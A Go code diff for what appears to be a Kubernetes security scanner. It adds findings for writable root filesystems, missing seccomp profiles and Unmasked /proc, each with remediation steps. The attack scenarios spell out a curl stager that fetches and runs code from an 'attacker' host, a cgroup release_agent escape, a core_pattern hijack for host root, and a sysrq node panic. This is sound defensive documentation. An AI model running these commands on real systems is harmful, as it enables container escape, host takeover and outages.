@@ -463,6 +463,104 @@ func contentSADefault001(kind, namespace, name, serviceAccount string) ruleConte
 	}
 }
 
+func contentPodSecReadonly001(kind, namespace, name, container string) ruleContent {
+	scope := scopeForWorkload(kind, namespace, name)
+	return ruleContent{
+		Title: fmt.Sprintf("Container `%s` has a writable root filesystem in `%s/%s/%s`", container, kind, namespace, name),
+		Scope: scope,
+		Description: fmt.Sprintf("Container `%s` in `%s/%s/%s` either omits `securityContext.readOnlyRootFilesystem` or sets it to `false`. The container's root filesystem is therefore writable: any process inside the container can drop new binaries to `/usr/local/bin`, modify in-image executables, plant a webshell under a static-served path, or rewrite configuration files that the application reads on the next request.\n\n"+
+			"A writable rootfs converts a transient code-execution bug into something durable. Cryptominer droppers (xmrig, kinsing), web-shells, opportunistic supply-chain payloads, and credential-stealing libpreload tricks all assume they can `chmod +x` something they wrote. Flipping the rootfs to read-only neutralises that step: every `write(2)` outside an explicitly-mounted volume returns `EROFS`, and the attacker has to escalate to a kernel CVE just to land a binary. The Pod Security Standards Restricted level requires `readOnlyRootFilesystem: true` for this reason.\n\n"+
+			"Legitimate writes (caches, scratch space, runtime sockets, the JVM `/tmp` directory) belong in explicit `emptyDir` volumes mounted at known paths. That keeps the writable surface small, scoped to the workload's actual needs, and out of reach of process injection that targets shared in-image paths.",
+			container, kind, namespace, name),
+		Impact: "Converts a single RCE into long-lived persistence inside the container; dropper-based malware, webshells, and binary tampering all become trivial.",
+		AttackScenario: []string{
+			"Gain code execution inside the container (web RCE, deserialisation gadget, vulnerable dependency).",
+			"Probe writability: `touch /usr/local/bin/x && echo writable` — succeeds because rootfs is mutable.",
+			"Drop a stager: `curl -sSL http://attacker/x -o /usr/local/bin/sysd && chmod +x /usr/local/bin/sysd && /usr/local/bin/sysd &`.",
+			"Plant a backdoor in the application: rewrite `node_modules/.bin/`, `site-packages/...`, or `/etc/ld.so.preload` so the next request loads attacker code.",
+			"Survive container restart by writing to any in-image path that the deployment treats as immutable (config files re-read on boot, init scripts).",
+		},
+		Remediation: "Set `readOnlyRootFilesystem: true` on every container; mount `emptyDir` volumes for legitimate writable paths.",
+		RemediationSteps: []string{
+			"Identify the directories the workload actually writes to (`/tmp`, `/var/run`, `/var/cache/<app>`, JVM temp). Add an `emptyDir` volume and `volumeMount` for each.",
+			"Set `securityContext.readOnlyRootFilesystem: true` on each container. Pair with `allowPrivilegeEscalation: false`, `capabilities.drop: [ALL]`, `runAsNonRoot: true`.",
+			"Apply Pod Security Admission `restricted` to the namespace so future regressions are blocked at admit time.",
+			fmt.Sprintf("Validate: `kubectl get %s/%s -n %s -o jsonpath='{.spec.template.spec.containers[*].securityContext.readOnlyRootFilesystem}'` returns `true` for every container.", strings.ToLower(kind), name, namespace),
+		},
+		LearnMore: []models.Reference{refPSS, refSecurityContext, refNSAHardening,
+			{Title: "Snyk — 10 Kubernetes security context settings you should understand", URL: "https://snyk.io/blog/10-kubernetes-security-context-settings-you-should-understand/"},
+			{Title: "Aqua — Container persistence techniques", URL: "https://www.aquasec.com/cloud-native-academy/container-security/container-persistence/"},
+		},
+		MitreTechniques: []models.MitreTechnique{mitreT1611, mitreT1554, mitreT1543},
+	}
+}
+
+func contentPodSecSeccomp001(kind, namespace, name, container string) ruleContent {
+	scope := scopeForWorkload(kind, namespace, name)
+	return ruleContent{
+		Title: fmt.Sprintf("Container `%s` runs without a seccomp profile in `%s/%s/%s`", container, kind, namespace, name),
+		Scope: scope,
+		Description: fmt.Sprintf("Container `%s` in `%s/%s/%s` either omits `securityContext.seccompProfile` (at both container and pod level) or sets it to `Unconfined`. The container therefore inherits the host kernel's unfiltered syscall surface — roughly 340 syscalls on a modern x86_64 Linux. The runtime's default seccomp profile (`RuntimeDefault`) blocks about 44 of those, including the syscall families that container-escape exploits depend on.\n\n"+
+			"Why that matters in practice: most container-escape CVEs published in the last five years were either fully blocked or substantially harder to weaponise under `RuntimeDefault`. CVE-2022-0492 (cgroup release_agent escape) needs `unshare(CLONE_NEWUSER|CLONE_NEWNS)` and `mount` — both filtered. CVE-2024-21626 \"Leaky Vessels\" abuses runc's working-directory handling at process start; default seccomp doesn't fully neutralise it but blocks several reliable post-exploitation primitives. Dirty Pipe (CVE-2022-0847), CVE-2022-0185 fsconfig, and the user-namespace + io_uring chain (CVE-2022-32250 family) all hit syscalls the default profile denies (`keyctl`, `add_key`, `bpf`, `userfaultfd`, `clone3` with namespace flags).\n\n"+
+			"The Pod Security Standards Restricted level mandates `seccompProfile.type: RuntimeDefault` or `Localhost` (with a pinned profile name). `Unconfined` is explicit opt-out and is forbidden. Container-level overrides take precedence; if absent, the pod-level setting applies. With nothing set at either level, the kernel runs the container without a seccomp filter at all.",
+			container, kind, namespace, name),
+		Impact: "Restores the full Linux syscall surface to in-container code; every recent container-escape exploit becomes substantially more reliable.",
+		AttackScenario: []string{
+			"Gain code execution inside the container.",
+			"Check the seccomp state: `grep Seccomp /proc/1/status` returns `0` (disabled) or `Unconfined`. Under `RuntimeDefault` it would return `2` (filtered).",
+			"Stage a cgroup release_agent escape (CVE-2022-0492 class): `unshare -UrmC --propagation=unchanged` to spawn a user-namespaced shell, then `mount -t cgroup -o rdma cgroup /mnt/c && echo 1 > /mnt/c/notify_on_release && echo '#!/bin/sh\\nbash -c \"...\" > /tmp/x' > /mnt/c/release_agent`.",
+			"Trigger the release: write a PID to `cgroup.procs` and exit. The kernel runs the release_agent payload on the host as root.",
+			"Under `RuntimeDefault` the same chain fails at step 3 because `unshare` returns `EPERM`; the escape cannot start.",
+		},
+		Remediation: "Set `securityContext.seccompProfile.type: RuntimeDefault` on every container (or once at the pod level).",
+		RemediationSteps: []string{
+			"Add `seccompProfile: { type: RuntimeDefault }` to either each container's `securityContext` or the pod-level `securityContext` (container-level wins on conflict).",
+			"For workloads that need a non-default filter (eBPF tooling, debuggers), ship a custom profile under `/var/lib/kubelet/seccomp/profiles/` on each node and set `type: Localhost` with `localhostProfile: <path>`. Never use `Unconfined`.",
+			"Apply Pod Security Admission `restricted` to the namespace to lock the requirement in at admit time.",
+			fmt.Sprintf("Validate: `kubectl exec -n %s <pod> -- grep Seccomp /proc/1/status` returns `2`. Inspect spec: `kubectl get %s/%s -n %s -o jsonpath='{.spec.template.spec.containers[*].securityContext.seccompProfile.type}'`.", namespace, strings.ToLower(kind), name, namespace),
+		},
+		LearnMore: []models.Reference{refPSS, refNSAHardening, refSecurityContext,
+			{Title: "Kubernetes — Restrict a Container's Syscalls with seccomp", URL: "https://kubernetes.io/docs/tutorials/security/seccomp/"},
+			{Title: "Docker — Seccomp security profiles", URL: "https://docs.docker.com/engine/security/seccomp/"},
+			{Title: "CVE-2022-0492 — cgroup release_agent container escape", URL: "https://nvd.nist.gov/vuln/detail/CVE-2022-0492"},
+		},
+		MitreTechniques: []models.MitreTechnique{mitreT1611, mitreT1068, mitreT1548_001},
+	}
+}
+
+func contentPodSecProcmount001(kind, namespace, name, container string) ruleContent {
+	scope := scopeForWorkload(kind, namespace, name)
+	return ruleContent{
+		Title: fmt.Sprintf("Container `%s` requests Unmasked /proc in `%s/%s/%s`", container, kind, namespace, name),
+		Scope: scope,
+		Description: fmt.Sprintf("Container `%s` in `%s/%s/%s` sets `securityContext.procMount: Unmasked`. This is an explicit opt-in — the default value `Default` is safe — and it disables the runtime's normal masking of `/proc`. Under `Default`, runc bind-mounts a small set of sensitive `/proc` paths to `/dev/null` (`maskedPaths`) and remounts another set read-only (`readonlyPaths`): `/proc/kcore`, `/proc/keys`, `/proc/latency_stats`, `/proc/timer_list`, `/proc/sched_debug`, `/proc/sysrq-trigger`, `/proc/sys/kernel/core_pattern`, `/proc/asound`, `/proc/bus`, `/proc/fs`, `/proc/irq`. Setting `Unmasked` strips that protection and exposes every path to the container as the kernel sees them.\n\n"+
+			"The unmasked surface is directly weaponisable from the container, even without extra capabilities in some cases. `/proc/sysrq-trigger` accepts a single character that drives the kernel's SysRq handler — `echo c > /proc/sysrq-trigger` panics the host (DoS). `/proc/sys/kernel/core_pattern` controls what userspace handler the kernel runs on a coredump; writing `|/tmp/x` and then triggering a crash in *any* process on the node causes the kernel to execute the named binary as root on the host (`CVE-style escape primitive`, no exploit chain required). `/proc/kcore` exposes kernel memory directly to readers with the right capability, enabling credential extraction.\n\n"+
+			"Pod Security Standards forbid non-Default `procMount` below the Privileged level — both Baseline and Restricted block it at admit time. There is essentially no legitimate application use case for `Unmasked`; it exists for narrow nested-container research scenarios.",
+			container, kind, namespace, name),
+		Impact: "Direct host kernel surface from the container: kernel panic, root command execution via core_pattern, kernel memory disclosure via /proc/kcore.",
+		AttackScenario: []string{
+			"Gain code execution inside the container with `procMount: Unmasked`.",
+			"Confirm: `ls -la /proc/sysrq-trigger /proc/kcore` — both visible as real device-like files instead of `/dev/null` symlinks.",
+			"Stage core_pattern hijack: `echo '|/tmp/payload' > /proc/sys/kernel/core_pattern && cp $(which evil) /tmp/payload && chmod +x /tmp/payload`.",
+			"Trigger a coredump in any process on the node (`kill -SIGSEGV $$` inside the container suffices on most kernels). The kernel executes `/tmp/payload` as root on the host on the next coredump.",
+			"Alternatively, panic the node for denial-of-service: `echo c > /proc/sysrq-trigger`.",
+		},
+		Remediation: "Remove `procMount: Unmasked` from the container `securityContext` (the default `Default` is the safe value).",
+		RemediationSteps: []string{
+			"Audit why `procMount: Unmasked` was set; the only legitimate uses are nested-container research scenarios. Drop the field for ordinary workloads.",
+			"Apply Pod Security Admission `baseline` (or stricter) to the namespace: `kubectl label ns <ns> pod-security.kubernetes.io/enforce=baseline`. Baseline forbids non-Default `procMount`.",
+			"For nested-container needs, run the workload in an isolated cluster or use a virtualisation-based runtime (Kata, gVisor) rather than relaxing host /proc masking.",
+			fmt.Sprintf("Validate: `kubectl get %s/%s -n %s -o jsonpath='{.spec.template.spec.containers[*].securityContext.procMount}'` is empty.", strings.ToLower(kind), name, namespace),
+		},
+		LearnMore: []models.Reference{refPSS, refPSA, refSecurityContext, refNSAHardening,
+			{Title: "OCI runtime-spec — Linux configuration (maskedPaths / readonlyPaths)", URL: "https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md"},
+			{Title: "Trail of Bits — Understanding Docker container escapes", URL: "https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/"},
+			{Title: "Kubernetes KEP — ProcMountType", URL: "https://github.com/kubernetes/enhancements/tree/master/keps/sig-node/2887-procmount-type"},
+		},
+		MitreTechniques: []models.MitreTechnique{mitreT1611, mitreT1068, mitreT1083},
+	}
+}
+
 func contentImageLatest001(kind, namespace, name, container, image string) ruleContent {
 	scope := scopeForWorkload(kind, namespace, name)
 	return ruleContent{
